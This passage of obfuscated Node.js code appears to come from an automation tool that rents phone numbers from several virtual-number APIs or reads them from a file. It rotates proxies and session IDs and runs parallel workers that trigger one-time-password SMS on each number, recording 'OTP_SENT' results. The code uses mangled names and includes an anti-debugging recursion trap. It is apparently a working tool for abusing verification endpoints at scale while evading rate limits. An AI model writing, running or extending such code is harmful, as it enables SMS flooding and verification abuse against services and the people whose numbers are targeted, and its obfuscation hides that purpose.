  v456.proxiesFile && fs.existsSync(v456.proxiesFile) && (v458 = fs.readFileSync(v456.proxiesFile, "utf8").split(/\r?\n/).map(v498 => v498.trim()).filter(v499 => v499 && !v499.startsWith('#')).map(v500 => parseProxy(v500)).filter(Boolean));
  setupOut(v456.singleNumber || (v457.length > 0x0 ? v457[0x0] : ''));
  const v459 = v456.nexaConfig || v456.twoOoConfig || v456.smsBowerConfig || v456.zenexConfig,
    v460 = v459 ? v459.totalCount : v457.length;
  process.stdout.write("[2J[H"), printHeader();
  if (v459) {
    const v501 = v456.nexaConfig ? "NexaOTP" : v456.twoOoConfig ? v456.twoOoConfig.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v456.smsBowerConfig ? "📱 SMS Bower" : "⚡ Zenex";
    console.log(C("✓ Target  : " + v501 + " API (" + v459.totalCount + " numbers)"));
  } else console.log(C("✓ Loaded " + v457.length + " targets"));
  if (v458.length === 0x0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v458.length));
  console.log(C("✓ Threads : " + v456.threads)), console.log(G("✓ Output  : " + OUT_DIR + '\x0a'));
  try {
    fs.writeFileSync(SUCCESSFUL_FILE, '');
  } catch (v502) {}
  try {
    fs.writeFileSync(FAILED_FILE, '');
  } catch (v503) {}
  const v461 = new Dashboard(v460);
  v461.render();
  let v462 = [],
    v463 = [],
    v464 = 0x0,
    v465 = false;
  if (v456.nexaConfig || v456.twoOoConfig) (async () => {
    let v504 = 0x0;
    try {
      for (let v505 = 0x0; v505 < v459.totalCount; v505++) {
        try {
          const v506 = v459.ranges[Math.floor(Math.random() * v459.ranges.length)];
          let v507;
          v456.nexaConfig ? v507 = await nexaLimiter.enqueue(() => nexaFetchNumber(v456.nexaConfig.apiKey, v506, v456.nexaConfig.serverEndpoint)) : v507 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v456.twoOoConfig.apiKey, v506, v456.twoOoConfig.getPath));
          if (v507) {
            v464++, v504 = 0x0;
            if (v463.length > 0x0) v463.shift()(v507);else v462.push(v507);
          }
        } catch (v508) {
          if (v508.message.includes("Insufficient balance")) break;
          if (v508.message.includes("No numbers available")) continue;
          v504++;
          if (v504 >= 0x5 && v464 === 0x0) break;
        }
      }
    } finally {
      v465 = true;
      while (v463.length > 0x0) v463.shift()(null);
    }
  })();else {
    if (v456.smsBowerConfig) {
      const v509 = v456.smsBowerConfig;
      (async () => {
        let v510 = 0x0;
        try {
          for (let v511 = 0x0; v511 < v509.totalCount; v511++) {
            try {
              const {
                phoneNumber: v512
              } = await smsBowerFetchNumber(v509.apiKey, v509.service, v509.country, v509.maxPrice);
              v464++, v510 = 0x0;
              if (v463.length > 0x0) v463.shift()(v512);else v462.push(v512);
            } catch (v513) {
              v510++;
              if (v510 >= 0x5 && v464 === 0x0) break;
              await new Promise(v514 => setTimeout(v514, 0x7d0));
            }
          }
        } finally {
          v465 = true;
          while (v463.length > 0x0) v463.shift()(null);
        }
      })();
    } else {
      if (v456.zenexConfig) {
        const v515 = v456.zenexConfig;
        (async () => {
          let v516 = 0x0;
          try {
            for (let v517 = 0x0; v517 < v515.totalCount; v517++) {
              try {
                const v518 = v515.ranges[Math.floor(Math.random() * v515.ranges.length)],
                  v519 = await zenexFetchNumber(v515.apiKey, v518);
                v464++, v516 = 0x0;
                if (v463.length > 0x0) v463.shift()(v519);else v462.push(v519);
              } catch (v520) {
                v516++;
                if (v516 >= 0x5 && v464 === 0x0) break;
                await new Promise(v521 => setTimeout(v521, 0x7d0));
              }
            }
          } finally {
            v465 = true;
            while (v463.length > 0x0) v463.shift()(null);
          }
        })();
      }
    }
  }
  const v466 = !!v459;
  const v467 = v466 ? () => {
      if (v462.length > 0x0) return Promise.resolve(v462.shift());
      if (v465) return Promise.resolve(null);
      return new Promise(v522 => v463.push(v522));
    } : () => {
      if (v457.length === 0x0) return Promise.resolve(null);
      const v523 = Math.floor(Math.random() * v457.length);
      return Promise.resolve(v457.splice(v523, 0x1)[0x0]);
    },
    fn6 = () => {
      if (v458.length === 0x0) return null;
      const v524 = v458[Math.floor(Math.random() * v458.length)];
      return rotateSessionId(v524);
    };
  function fn7(v525) {
    try {
      if (v466 || v456.singleNumber) return;
      const v526 = fs.readFileSync(v456.numbersFile, "utf8"),
        v527 = v526.split(/\r?\n/).filter(v528 => v528.trim() !== v525.trim()).join('\x0a');
      fs.writeFileSync(v456.numbersFile, v527);
    } catch (v529) {}
  }
  const v468 = v466 ? Math.min(v456.threads, v459.totalCount) : Math.min(v456.threads, v457.length || 0x1),
    v469 = [],
    v470 = setInterval(() => v461.render(), 0x190);
  async function fn8(v530) {
    while (true) {
      const v531 = await v467();
      if (!v531) break;
      try {
        const v532 = await triggerOTP(v531, {
          'onStatus': v533 => v461.setStatus("Worker " + v530 + ':\x20' + v533),
          'proxy': fn6(),
          'retries': v456.retries
        });
        v532.success ? (v461.successful++, v461.processed++, fn7(v531), fs.appendFileSync(SUCCESSFUL_FILE, v532.phone + "|OTP_SENT\n"), v461.addLog("Triggered OTP for " + v532.phone, "success")) : (v461.failed++, v461.processed++, fs.appendFileSync(FAILED_FILE, v532.phone + '|' + v532.message + '\x0a'), v461.addLog("Failed on " + v532.phone + ':\x20' + v532.message, "error"));
      } catch (v534) {
        v461.failed++, v461.processed++, v461.addLog("Fatal error on " + v531 + ':\x20' + v534.message, "error");
      }
    }
  }
  for (let v535 = 0x0; v535 < v468; v535++) {
    v469.push(fn8(v535 + 0x1));
  }
  await Promise.all(v469);
  clearInterval(v470), v461.render(), v461.stop();
}
isMainThread && start().catch(v536 => {
  console.error(R("Fatal error: " + v536.message)), process.exit(0x1);
});
function fn2(v537) {
  function fn9(v538) {
    fn9(++v538);
  }
  try {
    if (v537) return fn9;else fn9(0x0);
  } catch (v539) {}
}